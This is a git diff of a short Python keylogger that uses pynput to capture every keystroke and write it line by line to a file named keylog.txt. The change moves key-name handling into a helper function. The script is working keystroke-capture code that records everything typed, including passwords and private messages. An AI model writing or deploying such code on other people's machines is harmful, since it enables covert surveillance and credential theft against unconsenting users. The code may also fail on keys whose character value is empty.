@@ -1,4 +1,4 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, KeyCode, Listener
 
 def write_line():
     global line
@@ -6,6 +6,12 @@ def write_line():
     fp.write(line)
     fp.close()
     line = ''
+
+def get_key_name(key):
+    if isinstance(key, KeyCode):
+        return key.char.strip("'")
+    else:
+        return '[' + str(key) + ']'
 
 def on_press(key):
     global line
@@ -17,14 +23,7 @@ def on_press(key):
     elif key == Key.backspace:
         line = line[:-1]
     else:
-        try:
-            button = key.char.strip("'")
-        except:
-            button = '[' + str(key) + ']'
-
-        line += button
-
-
+        line += get_key_name(key)
 
 line = ''
 fp=open("keylog.txt","w")
